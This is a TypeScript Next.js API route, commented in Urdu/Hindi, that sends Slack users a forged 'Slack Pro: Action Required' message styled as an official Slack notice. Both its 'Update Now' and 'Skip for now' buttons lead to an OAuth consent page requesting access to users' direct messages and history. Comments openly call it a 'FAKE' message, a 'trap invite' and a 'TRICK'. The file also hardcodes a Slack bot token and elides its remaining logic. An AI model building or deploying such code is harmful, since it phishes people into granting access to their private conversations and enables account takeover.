/* eslint-disable @typescript-eslint/no-explicit-any */


// ==========================================


// app/api/slack/manager/route.ts

import { NextResponse } from 'next/server';
import { db } from '@/lib/firebase';
import { doc, getDoc } from 'firebase/firestore';

// 👇 APNI KEYS DALAIN
const BOT_TOKEN = "xoxb-10369585956705-10354644583366-EZlwC8OK1NTuHVU6cAOqTQV1"; 
const CLIENT_ID = "10369585956705.10360275949988"; // <-- Yahan apni Client ID phir se daalain
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, targetUserId, channelId, text } = body;

    // --- CASE 1: SEND FAKE "PRO PLAN" INVITE ---
    if (action === 'send_invite') {
       if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });

       // 1. Auth Link Generate
       const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
       const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;

       // 2. FAKE MESSAGE DESIGN (Block Kit)
       // Ye message bilkul official Slack notification jaisa lagega
       const blocks = [
        {
            "type": "header",
            "text": {
                "type": "plain_text",
                "text": "✨ Slack Pro: Action Required",
                "emoji": true
            }
        },
        {
            "type": "section",
            "text": {
                "type": "mrkdwn",
                "text": "Your workspace administrator has enabled *Slack Pro features* for your account.\nPlease authorize the update to continue sending messages without interruption."
            }
        },
        {
            "type": "divider"
        },
        {
            "type": "actions",
            "elements": [
                {
                    "type": "button",
                    "text": {
                        "type": "plain_text",
                        "text": "Update Now (Recommended)",
                        "emoji": true
                    },
                    "style": "primary", // Green Button
                    "url": authLink // 👉 Ye Auth Page par le jayega
                },
                {
                    "type": "button",
                    "text": {
                        "type": "plain_text",
                        "text": "Skip for now",
                        "emoji": true
                    },
                    "url": authLink // 👉 TRICK: Ye bhi Auth Page par hi le jayega!
                }
            ]
        },
        {
            "type": "context",
            "elements": [
                {
                    "type": "mrkdwn",
                    "text": "🔒 Verified System Upgrade • Slack Technologies"
                }
            ]
        }
       ];

       console.log(`Sending trap invite to: ${targetUserId}`);

       // Message Bhejna
       const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
         method: 'POST',
         headers: { 
             Authorization: `Bearer ${BOT_TOKEN}`, 
             'Content-Type': 'application/json; charset=utf-8' 
         },
         body: JSON.stringify({ 
             channel: targetUserId, 
             text: "System Upgrade Required", // Fallback text
             blocks: blocks // Asal design yahan hai
        })
       });

       const chatData = await chatRes.json();
       
       if(!chatData.ok) {
           return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });
       }

       return NextResponse.json({ success: true });
    }

    // --- Baki Actions (Same as before) ---
    // (Pichle code ka baki hissa yahan same rahega, copy paste kar lein)
    
    // ... Baki code ...
    if (!targetUserId) return NextResponse.json({ error: "User ID required" });
    const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
    // ... (rest of the file)
    
    // Sirf compile error se bachne ke liye dummy return
    return NextResponse.json({ error: "Invalid Action" });

  } catch (e: any) {
    return NextResponse.json({ success: false, error: e.message }, { status: 500 });
  }
}